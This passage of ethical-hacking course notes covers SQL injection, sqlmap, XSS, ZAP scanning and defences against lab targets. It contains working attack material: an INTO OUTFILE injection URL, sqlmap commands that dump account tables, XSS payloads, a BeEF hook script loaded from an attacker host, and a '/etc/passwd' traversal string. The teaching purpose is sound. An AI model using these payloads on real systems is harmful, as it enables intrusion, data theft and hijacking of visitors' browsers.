1.  **Attempt 1 (Fail):** He tries to write a file to `/var/www/mutillidae/example.txt`.
    * *Result:* **Error.**
    * *Reason:* The database user (MySQL) usually does not have permission to write files into the website's main folder. This is a security feature.
2.  **Attempt 2 (Success):** He changes the path to `/tmp/example.txt`.
    * *Result:* **Success.**
    * *Reason:* The `/tmp` (Temporary) folder in Linux is writable by almost everyone.

`
http://10.20.14.204/multillidae/index.php?page=user-info.php&username=zaid' union select null,'example example',null,null,null into outfile 'tmp/example.txt'%23&password=123456&user-info-php-submit-button=View+Account+Details
`

### The Hacker's Dilemma
While writing to `/tmp` proves the vulnerability exists, it is **not immediately useful** for hacking.
* **Why?** You cannot execute a file in `/tmp` from your web browser (e.g., you can't type `http://site.com/tmp/shell.php`).
* **The Solution (in real attacks):** A hacker would hunt for a specific folder inside the web root that *is* writable (like an `images` or `uploads` folder) and try to write their shell there.

### Summary Checklist

| Action | SQL Command | Purpose |
| :--- | :--- | :--- |
| **Read File** | `load_file('/path')` | Steal config files, passwords, or keys. |
| **Write File** | `INTO OUTFILE '/path'` | Upload a backdoor/shell to the server. |
| **Constraint** | **File Permissions** | You can only read/write files the Database User has access to. |

---
### <span style = "color: #569cd6">Discovering SQL Injections & Extracting Data Using SQLmap</span>

This lecture introduces **SQLMap**, a powerful tool that automates the entire SQL Injection process.

While the previous lectures taught you the "manual transmission" way of driving (typing every command by hand), SQLMap is the "self-driving car." It detects, exploits, and steals data automatically.

### Part 1: The Basic Scan (`-u`)
The first step is to point the tool at the target and let it figure out if a vulnerability exists.

* **Command:** `sqlmap -u "[URL]"`
    * **`-u`**: Stands for URL. You paste the link you want to attack inside quotes.
    * *Example:* `sqlmap -u "http://10.20.14.204/mutillidae/index.php?username=admin&password=aaas&user-info-php-submit-button=View+Account+Details"`

`sqlmap` for more information
* **What it does:**
    1.  **Fuzzing:** It tries thousands of different injections on every parameter (`username`, `password`) to see what breaks.
    2.  **Fingerprinting:** It identifies the Operating System (Linux/Ubuntu), the Web Server (Apache), and the Database Software (MySQL).
* **Result:** Among some questions, there will be a question asking you, **"Parameter 'username' is vulnerable. Do you want to keep testing others?"** (Usually, you say "No" because one entry point is enough).

### Part 2: The Discovery Phase (Enumeration)
Once SQLMap knows the site is vulnerable, you use specific "flags" (options) to map out the database, just like we did manually.

#### 1. List Databases (`--dbs`)
* **Goal:** See the list of all databases on the server.
* **Command:** `sqlmap -u [URL] --dbs`
ex: `sqlmap -u "http://10.20.14.204/mutillidae/index.php?username=admin&password=aaas&user-info-php-submit-button=View+Account+Details" --dbs`
* **Result:** It lists `dvwa`, `owasp10`, `mysql`, `tikiwiki`.

If we do `sqlmap -u "http://10.20.14.204/mutillidae/index.php?username=admin&password=aaas&user-info-php-submit-button=View+Account+Details" --current-user` => we can see that we are root

If we do `sqlmap -u "http://10.20.14.204/mutillidae/index.php?username=admin&password=aaas&user-info-php-submit-button=View+Account+Details" --current-db` => we can see `owasp10`

#### 2. List Tables (`--tables`)
* **Goal:** See the tables inside the specific target database (`owasp10`).
* **Command:** `sqlmap -u [URL] --tables -D owasp10`
    * **`-D`**: Selects the **D**atabase you want to focus on.
* **Result:** It lists `accounts`, `credit_cards`, `blogs`.

#### 3. List Columns (`--columns`)
* **Goal:** See the column names inside the `accounts` table.
* **Command:** `sqlmap -u [URL] --columns -T accounts -D owasp10`
    * **`-T`**: Selects the **T**able you want to focus on.
* **Result:** It lists `username`, `password`, `is_admin`.

### Part 3: The Theft (`--dump`)
This is the final step where you steal the actual data.

* **Command:** `sqlmap -u [URL] -T accounts -D owasp10 --dump`
    * **`--dump`**: Tells SQLMap to extract all data and display it on your screen.
* **Result:** SQLMap creates a neat table showing every user and password found in the database.



### Summary Cheat Sheet

| Goal | SQLMap Flag | Manual Equivalent (Concept) |
| :--- | :--- | :--- |
| **Scan Target** | `-u "[URL]"` | Adding `'` to the URL to see if it crashes. |
| **List DBs** | `--dbs` | `SELECT schema_name FROM information_schema...` |
| **Select DB** | `-D [Name]` | `WHERE table_schema = 'Name'` |
| **List Tables** | `--tables` | `SELECT table_name FROM...` |
| **Select Table** | `-T [Name]` | `WHERE table_name = 'Name'` |
| **Steal Data** | `--dump` | `UNION SELECT username, password...` |

### Why use SQLMap?
1.  **Speed:** It types thousands of times faster than you.
2.  **Blind Injection:** Sometimes a website *is* vulnerable but doesn't show errors (this is called "Blind SQL Injection"). This is extremely hard to do manually, but SQLMap handles it easily by asking True/False questions and measuring how long the server takes to reply.

---
### <span style = "color: #569cd6">The Right Way To Prevent SQL Injection Vulnerabilities</span>

Based on the final transcript of the SQL Injection module, the instructor moves from "breaking" to "fixing." He explains why simple fixes often fail and introduces the **only robust way** to stop SQL Injection.

### 1. The Wrong Way: Filters (Blacklists & Whitelists)
Many developers try to fix SQL Injection by creating a list of "bad words" (like `UNION`, `SELECT`, `DROP`, or the quote symbol `'`).
* **The Idea:** "If I see the user type the word `UNION`, I will block them."
* **Why it fails:** Hackers are smart. They can use tricks to bypass these filters, such as:
    * Using different encoding (like URL encoding `%27` instead of `'`).
    * Changing capitalization (`uNiOn` instead of `UNION`).
    * Using alternative SQL commands that do the same thing.
* **The Verdict:** Filters are like putting a bandage on a broken leg. They hide the problem but don't fix it.

### 2. The Right Way: Parameterized Statements
The instructor emphasizes that the **only 100% secure method** is to separate the *Code* from the *Data*.

#### How the Vulnerability Happens (The Old Way):
In the vulnerable code, the application takes your input and glues it directly into the command string.
* **Code:** `SELECT * FROM users WHERE username = '` + **User_Input** + `'`
* **Result:** If you type `admin' OR 1=1`, the database reads it as part of the command logic.

#### How to Fix It (The New Way):
In a **Parameterized Statement** (also called Prepared Statements), you define the command structure *first*, using placeholders (often a `?`).

1.  **Prepare:** You tell the database: "I am going to ask for a user. Get ready."
    * `SELECT * FROM users WHERE username = ?`
2.  **Bind:** You tell the database: "Okay, the value for that `?` is the text the user just typed."
3.  **Execute:** The database runs the search.

**Why this works:**
Because the structure was defined *before* the data arrived, the database treats **everything** the user types as just plain text.
* **Attack:** If the hacker types `admin' UNION SELECT#`

```bash
select * from accounts where username ='admin' UNION SELECT#'
```
* **Database Reaction:** Instead of running the hack, the database thinks: *"Oh, you are looking for a user whose literal name is 'admin' UNION SELECT...'? Weird name, but okay. I checked, and no user has that long, weird name."*



### 3. Second Line of Defense: Least Privilege
The instructor adds one final security tip: **Don't give your database user too much power.**

* **The Scenario:** When a website connects to the database, it uses an internal account (e.g., `db_user`).
* **The Mistake:** Using the `root` (Super Admin) account for the website connection. If a hacker breaks in via SQL Injection, they become Root and can destroy everything.
* **The Fix:** Create a limited user.
    * Does the website only need to read blog posts? Give the user **SELECT** permission only.
    * If a hacker breaks in, they can't delete tables (`DROP`) or add new admins (`INSERT`) because the account simply isn't allowed to do that.

### Summary Checklist for Defense

| Defense Strategy | Effectiveness | How it works |
| :--- | :--- | :--- |
| **Input Validation** | Low | Blocks specific characters (often bypassed). |
| **Parameterized Statements** | **High (Essential)** | Treats user input strictly as data, never as code. |
| **Least Privilege** | Medium (Damage Control) | Limits what a hacker can do *if* they get in. |

### Conclusion of Section
This concludes the **SQL Injection** module! You have gone from understanding the database structure to manually injecting commands, automating the attack with SQLMap, and finally learning how to patch the vulnerability securely.

---
CROSS SITE SCRIPTING (XSS) VULNERABILITIES
===

### <span style = "color: #569cd6">Introduction</span>

This lecture introduces a completely new category of hacking. We are leaving the world of attacking the **Server** (SQL Injection, File Uploads) and entering the world of attacking the **User**.

This vulnerability is called **Cross-Site Scripting (XSS)**.

### Part 1: What is XSS?
**The Definition:** XSS allows an attacker to inject **JavaScript code** into a webpage that other people are viewing.

**The Key Shift (Server vs. Client):**
* **In previous lectures (SQLi/Command Exec):** You attacked the **Server**. You wanted to steal the database or control the server's operating system.
* **In XSS:** You attack the **Client (The User)**.
    * The code you write does *not* run on the web server.
    * It runs inside the **web browser** of the victim (e.g., Chrome, Firefox).

**The Analogy:**
Think of the web server as a Post Office.
* **SQL Injection:** You break into the Post Office and steal the mail (Database).
* **XSS:** You put a poisonous powder inside an envelope and mail it. The Post Office (Server) is fine; it just delivers the envelope. The person who opens the envelope (The User) is the one who gets attacked.

### Part 2: The Three Types of XSS
The instructor outlines the three main ways this attack happens.

#### 1. Stored XSS (Persistent) - *The Most Dangerous*
* **How it works:** You find a place on the website that saves information, like a "Comments" section or a "Forum Post."
* **The Attack:** You write a malicious script instead of a normal comment: `<script>...virus...</script>`.
* **The Result:** The website saves your comment in its database. Now, **every single person** who visits that page will automatically load your comment, run your script, and get hacked.
* **Analogy:** Spray-painting graffiti on a wall in a busy square. Everyone who walks by sees it automatically.

#### 2. Reflected XSS - *The Trap*
* **How it works:** The website doesn't save the code. Instead, the code is part of the URL itself.
* **The Attack:** You create a special link that contains the virus: `http://site.com/search?q=<script>...`.
* **The Result:** You have to send this link to a specific victim (via email or chat). If they click it, the website "reflects" the script back to them, and they get hacked. If they don't click your link, nothing happens.
* **Analogy:** Sending a poisoned letter. Only the person you mail it to is at risk.

#### 3. DOM-Based XSS - *The Stealthy One*
* **How it works:** This happens entirely inside the browser's "brain" (the DOM), often in modern web apps that update without reloading the page.
* **The Danger:** Because the malicious code is processed by the browser's JavaScript *before* it even talks to the server, **Server-Side Security Filters** (like firewalls) often cannot see it. It is invisible to the server's defenses.

### Summary Table

| Type | Persistence | Target Audience | How it spreads |
| :--- | :--- | :--- | :--- |
| **Stored** | High (Permanent) | **Everyone** who visits the page. | Automatic. |
| **Reflected** | Low (One-time) | **Specific Victim** who clicks. | Phishing / Links. |
| **DOM-based** | Variable | **Specific Victim**. | Bypasses server filters. |

---
### <span style = "color: #569cd6">Discovering Reflected XSS</span>

Based on the transcript, the instructor is demonstrating **Reflected XSS** (Cross-Site Scripting). This is the "trap" version of XSS where the malicious code lives inside a link rather than the database.

### Part 1: The Discovery Strategy

Just like with SQL Injection, the first step is to find **input fields** where the website talks back to you.

  * **The Scenario:** You type your name into a box (e.g., "Zaid").
  * **The Response:** The website displays it back to you: *"Hello Zaid"*.
  * **The Theory:** If the website displays *exactly* what you typed without checking it, you can type JavaScript code instead of a name, and the website will "display" (run) that code.

### Part 2: The "Alert Box" Test

Hackers have a standard way to prove an XSS vulnerability exists without doing any damage. They try to pop up a useless message box.

**The Payload:**

```html
<script>alert('XSS')</script>
```

  * **`<script>`**: HTML tag that tells the browser "Start reading JavaScript code now."
  * **`alert('XSS')`**: A JavaScript function that creates a simple pop-up window with text.
  * **`</script>`**: HTML tag that tells the browser "Stop reading code."

**The Result:**

1.  The instructor types this payload into the "Name" box.
2.  He hits "Submit."
3.  instead of seeing the text "Hello `<script>...`", a **pop-up box appears** saying "XSS".
4.  **Conclusion:** The browser obeyed the code. The site is vulnerable.

### Part 3: The Mechanics of Reflected XSS

The instructor highlights a critical detail: **The URL changed.**

Because the form uses a **GET** request (just like we saw in the SQL lectures), the data is put into the address bar.

  * **Normal URL:** `http://site.com/vulnerabilities/xss_r/?name=Zaid`
  * **Hacked URL:** `http://site.com/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>`

**Why is this dangerous?**
This is why it is called "Reflected." The code is bouncing off the server and back to the user via the link.

  * **The Attack:** You copy that long, messy URL containing the script.
  * **The Delivery:** You email that link to a victim (e.g., *"Check out this cool profile\!"*).
  * **The Execution:** When the victim clicks **your** link, the website loads, reads the script from the URL, and executes it in **their** browser.

### Summary Checklist

| Step | Action | Result |
| :--- | :--- | :--- |
| **1. Find Input** | Locate a text box that displays your input back to you. | "Hello [Name]" |
| **2. Test** | Inject `<script>alert('1')</script>`. | A pop-up box appears. |
| **3. Weaponize** | Copy the URL containing the script. | You now have a malicious link. |
| **4. Distribute** | Send the link to a victim. | If they click, the script runs on *their* computer. |

---
### <span style = "color: #569cd6">Discovering Stored XSS</span>

This lecture covers **Stored XSS** (also known as Persistent XSS), which the instructor describes as "much more dangerous" than the Reflected type you learned previously.

### Part 1: The Concept (The "Landmine")

  * **Reflected XSS (Previous Lecture):** The malicious code is in the **URL**. You have to trick the victim into clicking *your* specific link. It's a targeted attack (Sniper).
  * **Stored XSS (This Lecture):** The malicious code is saved in the **Database**. You don't need to send a link to anyone. You just post the virus once, and the website delivers it to everyone who visits the page automatically. It's a trap (Landmine).

### Part 2: The Target (The Guestbook)

The instructor chooses a "Guestbook" page to demonstrate this.

  * **Why a Guestbook?** It is the perfect target because its entire purpose is to take text from one user and display it to *everyone else*. Other examples include **Comment Sections, Forum Posts, or Profile Descriptions**.
  * **Normal Behavior:**
    1.  User posts: "Hello everyone\!"
    2.  Database saves: "Hello everyone\!"
    3.  Page displays: "Hello everyone\!"

### Part 3: The Attack

Name: `zaid`
Message: `<script>alert('XSS')</script>`

1.  **The Input:** Instead of a nice message, the instructor types the standard test payload into the message box:
    ```html
    <script>alert('XSS')</script>
    ```
2.  **The Submission:** He clicks "Sign Guestbook."
3.  **The Storage:** The website (being vulnerable) takes that text—tags and all—and saves it permanently into the database.

### Part 4: The Result (Persistence)

This is the scary part.

1.  **Immediate Feedback:** As soon as the comment is posted, the pop-up box appears.
2.  **The Trap is Set:** The instructor navigates away to the "Home" page, then clicks back to the "Guestbook."
      * **Result:** The pop-up appears **again**.
      * **Meaning:** The code is now a permanent part of the webpage. If the Administrator visits this page to moderate comments, *their* browser will run the script, and you could potentially steal their session cookies and take over the site.

### Summary: Reflected vs. Stored

| Feature | Reflected XSS | Stored XSS |
| :--- | :--- | :--- |
| **Location of Code** | In the **URL** (Link). | In the **Database** (Server). |
| **Duration** | Temporary (One click). | Permanent (Until deleted). |
| **Victim** | Only the person you send the link to. | **Anyone** who views the page. |
| **Stealth** | Harder (URL looks suspicious). | High (URL looks normal). |

---
### <span style = "color: #569cd6">Exploiting XSS - Hooking Vulnerable Page Visitors</span>

Based on the transcript, the instructor is taking the **Stored XSS** vulnerability from the previous lecture and weaponizing it using a framework called **BeEF** (Browser Exploitation Framework).

### Part 1: The Tool (BeEF)
* **What is it?** BeEF is a hacking tool designed specifically to control web browsers.
* **How it works:** It uses a "Hook." This is a small piece of JavaScript code (`hook.js`) that connects the victim's browser back to the attacker's server.
* **The Goal:** Once a browser is "hooked," it becomes a zombie. The attacker can send commands to it (like "steal passwords," "take a screenshot," or "show a fake login bar") as long as the tab remains open.

### Part 2: The Bypass (Inspect Element)
The instructor encounters a common obstacle: The text box on the website is too short.
* **The Problem:** The malicious script is long (`<script src="http://10.20.14.207:3000/hook.js"></script>`), but the website's text box has a `maxlength="50"` limit.
* **The Trick:** He uses **Inspect Element** (Developer Tools) to modify the HTML of the page *before* sending the data.
    * He changes `maxlength="50"` to `maxlength="500"`.
    * **Lesson:** Client-side restrictions (like character limits) are easily bypassed because they run on *your* computer, not the server.

### Part 3: The Injection (Stored XSS)
1.  **Inject:** He pastes the BeEF hook script into the Guestbook "Message" field.
2.  **Save:** He clicks "Sign Guestbook."
3.  **Persistence:** Because this is **Stored XSS**, that script is now permanently saved in the database.
    * *Result:* Anyone who visits the Guestbook page—whether it's a user or an admin—will silently download and run the `hook.js` file from the attacker's machine.



### Part 4: The Control Phase
1.  **The Victim:** The instructor switches to a Windows machine and browses the Guestbook. To the user, everything looks normal (no weird pop-ups yet).
2.  **The Connection:** Back on the attacker's screen (Kali Linux), the Windows machine appears in the "Online Browsers" list in BeEF.
3.  **The Command:** To prove he has control, the instructor selects the victim and sends a "Create Alert Dialog" command.
    * *Result:* A pop-up appears on the Windows machine.

### Summary Checklist

| Action | Purpose |
| :--- | :--- |
| **Start BeEF** | Get the URL for the `hook.js` file. |
| **Inspect Element** | Bypass the character limit on the text box. |
| **Inject Script** | Plant the "Hook" into the Guestbook (Stored XSS). |
| **Wait** | Wait for victims to visit the page. |
| **Execute Command** | Send instructions (like Keylogger or Alert) to the hooked browser. |

---
### <span style = "color: #569cd6">Preventing XSS Vulnerabilities</span>

This lecture concludes the XSS module by focusing on **Defense**. The instructor splits the advice into two categories: how **Developers** can fix the code, and how **Users** can spot an attack.

### Part 1: Defense for Developers (Escaping)
The root cause of XSS is that the website treats user input as code.
* **The Problem:** If a user types `<script>`, the browser sees the `<` symbol and thinks, "Aha! This is the start of a command."
* **The Solution:** You must **Escape** (or Sanitize) the input before displaying it.

**How Escaping Works:**
Escaping converts special characters into their safe "HTML Entity" equivalents.
* **Unsafe Input:** `<script>`
* **Escaped Output:** `&lt;script&gt;`

**The Result:**
When the browser sees `&lt;`, it knows to **display** the symbol `<` on the screen, but it knows **not to execute** it as code.
* **Without Escaping:** The pop-up box appears (Code runs).
* **With Escaping:** The text `<script>alert('XSS')</script>` appears on the screen as a harmless message (Code does not run).



**Where to apply this?**
The instructor emphasizes that you cannot just sanitize the obvious text boxes. You must sanitize **everything** a user touches, including:
* Visible comments.
* Hidden IDs (`<div id="USER_INPUT">`).
* Image sources (`<img src="USER_INPUT">`).
* URL parameters.

### Part 2: Defense for Users (Behavioral)
Even if developers try their best, vulnerabilities happen. As a user, you are the last line of defense against attacks like **BeEF** (which we saw in the previous lecture).

**The Golden Rule: Never Trust the Pop-up.**
Hackers use XSS to display fake system notifications inside the browser.

1.  **The "Fake Update" Attack:**
    * **Scenario:** A pop-up says, *"Your Firefox is outdated. Click here to update."*
    * **The Defense:** **Ignore it.** Open a new tab, go to the official Firefox website manually, and check for updates there. Never download a file from a random pop-up.

2.  **The "Fake Login" Attack:**
    * **Scenario:** A pop-up says, *"Your session timed out. Please log in again to Facebook."*
    * **The Defense:** **Ignore it.** Open a new tab, go to `facebook.com` manually, and check if you are still logged in. Real websites rarely ask you to re-login via a pop-up window in the middle of a session.

3.  **Technical Checks:**
    * **HTTPS:** Ensure the lock icon is green and you are on the correct domain.
    * **MD5 Checksum:** If you download a file, compare its "digital fingerprint" (MD5 hash) with the official one listed on the vendor's website to ensure it wasn't tampered with.

### Summary Checklist

| Role | Strategy | Action |
| :--- | :--- | :--- |
| **Developer** | **Sanitization** | Convert `<` into `&lt;` so browsers display it as text, not code. |
| **User** | **Skepticism** | Never click "Update" or "Login" pop-ups. Go to the official site manually. |
| **User** | **Verification** | Check HTTPS and File Checksums (MD5) to ensure integrity. |

---

DISCOVERING VULNERABILITIES AUTOMATICALLY
===

### <span style = "color: #569cd6">Automatically Sacnning Target Websites For Vulnerabilities</span>

Based on the transcript, this lecture introduces **Automated Vulnerability Scanning**.

Until now, you have been hacking "manually"—typing every SQL command and XSS script by hand. This is great for learning, but it is slow. In the real world, hackers use tools to do the heavy lifting for them.

The tool introduced here is **OWASP ZAP** (Zed Attack Proxy).

### Part 1: Why Manual First?
The instructor explains why he didn't show you this tool on day one.
* **Understanding:** If you just click a button, you don't learn *how* the hack works.
* **False Positives:** Tools make mistakes. They might say a site is vulnerable when it isn't. You need manual skills to verify the results.
* **Missed Bugs:** Tools are robots. They can't "think" creatively. They might miss a complex logic flaw that a human would spot.

### Part 2: The Tool (OWASP ZAP)
**OWASP ZAP** is a free, open-source scanner that acts like a "Robot Hacker." It automatically browses the website and tries thousands of attacks (SQLi, XSS, Command Execution, etc.) on every page it finds.



**The Interface:**
* **Left Panel (Sites):** Shows the targets (websites) you are currently testing.
* **Top Right (URL Bar):** Where you type the address you want to attack.
* **Bottom Panel (Results):** Where the vulnerabilities will appear once found.

### Part 3: Configuration (Scan Policies)
Before hitting the big red "Attack" button, you can configure *how* the robot behaves.

**The "Policy" Manager:**
You can customize the scan based on what you are looking for.
* **Categories:** You can turn specific attacks on or off. For example, if you only care about **SQL Injection**, you can turn off the XSS and Path Traversal scanners to save time.
* **Threshold (Sensitivity):**
    * **Low:** Report *everything* that looks suspicious (lots of false alarms).
    * **High:** Only report if you are 100% sure (might miss some things).
* **Strength (Aggression):**
    * **Low:** Send a few basic attacks (fast/stealthy).
    * **High:** Send thousands of variations (slow/noisy).



### Part 4: The Attack Process
The instructor targets the **Mutillidae** site (`10.20.14.204/mutillidae`) and starts the attack. ZAP performs two distinct phases:

1.  **The Spider (Crawling):**
    * **Goal:** Map the website.
    * **Action:** The tool clicks every link, opens every image, and finds every hidden page (like `admin.php` or `login.php`). It builds a map of the site.

2.  **The Active Scan (Attacking):**
    * **Goal:** Break the website.
    * **Action:** It takes the map from step 1 and revisits every page. It injects malicious code (SQL quotes, XSS scripts) into every text box and URL parameter it found to see if the site breaks.

### Summary Checklist

| Feature | Manual Hacking | Automated (ZAP) |
| :--- | :--- | :--- |
| **Speed** | Slow (One attack at a time) | Fast (Thousands of attacks per minute) |
| **Accuracy** | High (Human verification) | Medium (Prone to false alarms) |
| **Coverage** | Low (You might miss a page) | High (Spiders every link) |
| **Best Use** | Targeted exploits & verification | Initial reconnaissance & wide sweep |

---
### <span style = "color: #569cd6">Analysing Scan Results</span>

This final lecture in the web hacking section focuses on **Analyzing the Report** generated by the automated scanner (OWASP ZAP).

The scanner has finished its work. Now, you act as the analyst, reviewing the findings to separate the real threats from the false alarms.

### Part 1: The Dashboard (The "Alerts" Tab)
The instructor focuses on the **Alerts** tab, which organizes vulnerabilities by severity using colored flags:
* **Red Flags (High Priority):** Critical issues. These usually mean "I can take over the server immediately" (e.g., SQL Injection, Remote File Inclusion).
* **Orange Flags (Medium Priority):** Dangerous but might require more work to exploit (e.g., XSS).
* **Yellow/Blue Flags (Low/Info):** Minor configuration errors or information leaks.

### Part 2: Verifying the Findings
The tool provides evidence for every bug it finds. The instructor reviews three specific examples to prove the scanner works.

#### Case 1: Path Traversal (LFI)
* **The Alert:** The scanner claims it found a **Path Traversal** vulnerability.
* **The Evidence:**
    * **Attack Used:** It injected `../../../../etc/passwd`.
    * **Response:** The tool highlights that the server replied with the actual text of the `/etc/passwd` file (the user list).
* **The Verification:** The instructor right-clicks the alert and selects **"Open in Browser."**
    * *Result:* The browser opens, and the sensitive file is displayed on the screen. **Confirmed.**

#### Case 2: Cross-Site Scripting (XSS)
* **The Alert:** The scanner found XSS in both **GET** (URL) and **POST** (Form) parameters.
* **Why this is cool:** Humans often miss **POST** vulnerabilities because the data is hidden inside the HTTP packet (like the "Register" button). The robot checks *everything*.
* **The Verification:** He opens the link, and the script runs (likely a pop-up box). **Confirmed.**

#### Case 3: SQL Injection
* **The Alert:** The scanner found an SQL Injection in the `password` parameter.
* **The Evidence:** It used the payload `AND 1=1`.
* **The Connection:** The instructor notes this is the **exact same vulnerability** we exploited manually in earlier lectures.
    * *Takeaway:* The scanner found in 5 minutes what might take a human 30 minutes to find manually.

### Summary of the Automated Workflow

| Step | Action | Purpose |
| :--- | :--- | :--- |
| **1. Scan** | Run the Spider and Active Scan. | Let the robot find potential bugs. |
| **2. Review** | Check the **Alerts** tab. | Prioritize the Red flags. |
| **3. Analyze** | Look at the **Request/Response** tabs. | See *what* the tool sent and *why* it thinks it worked. |
| **4. Verify** | **Open in Browser**. | Confirm the hack actually works on the live site. |

### Conclusion of the Web Hacking Module
You have now completed the Web Application Hacking section! You have learned:
1.  **Information Gathering:** Finding who owns the site and what tech it runs (Netcraft, Whois).
2.  **File Vulnerabilities:** Uploading viruses and reading system files (Uploads, LFI/RFI).
3.  **Database Attacks:** Stealing passwords and credit cards (SQL Injection).
4.  **Client Attacks:** Hacking other users via the browser (XSS).
5.  **Automation:** Using tools like ZAP and SQLMap to do it all faster.

---
### <span style = "color: #569cd6">Website Hacking / Penetration Testing Conclusion</span>

Up until now, the instructor told you exactly what to do: *"Go to this page, type this specific code, and watch it break."*

But in the real world, nobody tells you *"Hey, the login page has an SQL injection."* You have to find it yourself. This lecture explains the **workflow** professional hackers use to approach a new target.

### The Big Question: "Where do I start?"
Students often ask: *"How do I know which vulnerability to use on a specific page?"*

**The Answer:** You don't know. You have to try **all of them**.
* You don't look at a page and say, *"That looks like an SQL Injection."*
* You look at a page and say, *"That looks like an Input Field. I will try SQL Injection, XSS, and Command Execution on it to see what works."*

### The Professional Workflow (The Methodology)

The instructor outlines a 3-step process for attacking any website:

#### Step 1: Reconnaissance (The Map)
Before you attack, you must know how big the target is.
* **Find Subdomains:** Use tools (like Knockpy) to find `dev.site.com` or `admin.site.com`.
* **Find Directories:** Use tools (like Dirb) to find hidden folders.
* **Map Technologies:** Use tools (like Netcraft) to see if they use PHP, Python, or WordPress.

#### Step 2: Understanding (The User Experience)
Don't start hacking yet. Just use the website like a normal person.
* **Click every link.**
* **Fill out every form.**
* **Understand the logic:** If you upload a profile picture, where does it go? If you search for a product, how does the URL change?
* **Why?** You cannot break the logic if you don't understand how it is *supposed* to work.

#### Step 3: Testing (The Attack)
Now, you go back to every page you found in Step 2 and test **every input**.

**Where are the Inputs?**
The instructor highlights two specific places where you inject your code:

1.  **URL Parameters (The `=` sign):**
    * Look at the address bar: `http://site.com/search?q=phone&category=1`
    * The hacker sees: `?q=[ATTACK HERE]&category=[ATTACK HERE]`
    * You try injecting `'` (SQL), `<script>` (XSS), and `;` (Command Exec) into those spots.

2.  **Input Boxes (The Forms):**
    * Search bars, Login fields, Comment boxes, Contact forms.
    * Even big companies like Google have these boxes, and they have been vulnerable in the past.

### The "Invisible" Inputs (Using a Proxy)
The instructor notes that some modern websites (like `zSecurity.org`) look "clean." They don't have obvious parameters like `?id=1` in the URL bar.

* **Does this mean they are safe?** No.
* **Where is the data?** The data is still being sent to the server, but it is hidden in the background (often via HTTP POST requests).
* **The Solution: Burp Suite**
    * The instructor mentions a tool called **Burp Suite**.
    * **What it does:** It acts as a "Man-in-the-Middle" between your browser and the website. It lets you pause the data in mid-air, see the hidden parameters, modify them, and then forward them to the server.
    * *Note:* Burp Suite is an advanced tool covered in his dedicated Web Hacking course, but it's the industry standard for finding these hidden vulnerabilities.



### Summary Checklist

| Phase | Action |
| :--- | :--- |
| **1. Map** | Find all subdomains and pages. |
| **2. Browse** | Click every link to understand the site features. |
| **3. Identify** | Find every input (URL parameters and text boxes). |
| **4. Attack** | Test **every** vulnerability (SQL, XSS, LFI) on **every** input. |

---
### <span style = "color: #569cd6">Writing a Pentest Report</span>

A **Pentest Report** is the official document that tells the client what you found, how dangerous it is, and how to fix it. Without this report, your client cannot improve their security, and you (the pentester) usually don't get paid.

### 1. The Two Audiences
The most important concept in reporting is that you are writing for **two very different people** at the same time:

1.  **The Executive (CEO/Manager):**
    * **Non-technical.** They don't care about "SQL Injection" or "Buffer Overflows."
    * **What they want:** "Is my company safe? How much will it cost to fix? Are we going to get sued?"
2.  **The Technician (Developer/SysAdmin):**
    * **Highly technical.** They don't care about pie charts.
    * **What they want:** "Which file is broken? What line of code do I change? How do I reproduce the bug?"

### 2. The Report Structure
The lecture walks through a sample ZSecurity report. Most professional reports follow this standard hierarchy:

#### A. The Cover Page & Change Log
This is standard documentation.
* **Cover Page:** Includes the Report Title, Date, Version, and Contact Info for both your team and the client.
* **Change Log:** Tracks edits. If you release "Version 1.0" on Jan 1st and "Version 1.1" on Jan 10th, you must list exactly what changed (e.g., "Added findings from Recon stage").

#### B. The Executive Summary (For the Boss)
This section is short (1-2 pages) and contains **no technical jargon**.
* **Risk Ratings:** Uses simple charts (Pie charts/Bar graphs) to show the count of High, Medium, and Low risks.
* **Impact Overviews:** instead of saying "SQL Injection in parameter ID," you say "Critical flaw allowing unauthorized access to the customer database."
* **Strategic Recommendations:** High-level advice like "Update your patching policy" rather than specific code fixes.



#### C. The Engagement Summary (The Rules)
This section protects you legally and clarifies the work.
* **Scope:** Lists exactly what you were allowed to test (e.g., `192.168.1.1` to `192.168.1.50`). If a vulnerability was found on a server *outside* this list, you note that it was out of scope.
* **Risk Definitions:** Explains what you mean by "Critical" vs. "Low."
    * *Example:* **Critical** = Fix immediately (Weekend work). **Low** = Fix during next scheduled maintenance.

#### D. The Technical Details (For the Admin)
This is the longest section. You create a detailed subsection for **every single bug** you found.
* **Vulnerability Name:** e.g., "Reflected XSS."
* **Location:** The exact URL or IP address (e.g., `http://site.com/search?q=`).
* **Proof of Concept (PoC):** Step-by-step instructions on how to trigger the bug. You must include the **HTTP Request** you sent and the **HTTP Response** the server gave back.
* **Screenshots:** Visual proof that the exploit worked.
* **Remediation:** Specific technical instructions (e.g., "Use Prepared Statements in PHP" or "Sanitize input using HTML Entity encoding").


### 3. Legal and Liability
The instructor mentions a **Legal Section** containing disclaimers, GDPR notices, and privacy statements.
* **Key Takeaway:** As a pentester, you almost never write this yourself. Your company's legal team provides a template. **Never modify legal disclaimers** without consulting a lawyer, as they protect you from being sued if a scan accidentally crashes the client's server.

### Summary Checklist
| Section | Audience | Content |
| :--- | :--- | :--- |
| **Executive Summary** | Management | Charts, Risk Levels, Business Impact (Money/Reputation). |
| **Engagement Summary** | Project Managers | Scope, Methodology, Definitions. |
| **Technical Findings** | Developers/Admins | Proof of Concept, Code Snippets, Screenshots, Fixes. |

---
### <span style = "color: #569cd6">4 Ways to Secure Websites & Apps</span>

The instructor starts by debunking common myths. Many people think they are safe just because they use **HTTPS**, have **Backups**, or host their site on a big cloud provider like **AWS**.
* **The Reality:** These are good, but they don't stop hackers.
    * **Backups** help you recover *after* a disaster, but they don't prevent the hack.
    * **HTTPS** protects data while it travels, but it doesn't protect the website itself.
    * **Complex Passwords** don't help if the hacker exploits a bug in the code to bypass the login screen entirely.

To truly secure an application, the instructor outlines **Four Major Approaches**.

### 1. Secure Coding (Building it Right)
This is the preventative measure. It means training developers to write code that doesn't have security holes in the first place.
* **The Ideal:** You build a house with fireproof materials so it never catches fire.
* **The Problem:** This is very hard. Developers make mistakes, and often you use code written by other people (third-party libraries) that you didn't write yourself.



### 2. Code Review (Checking the Work)
This is where a second pair of eyes looks over the code to find mistakes before the application goes live.
* **The Process:** Even if you wrote the code yourself, you get another expert to review line-by-line to catch things you missed.
* **The Pro:** It catches bugs early.
* **The Con:** It is slow and expensive, especially for large applications.

### 3. Penetration Testing ("Pen Test")
This is a simulation of a real attack. You hire a professional team of "Ethical Hackers" to try and break into your specific application.

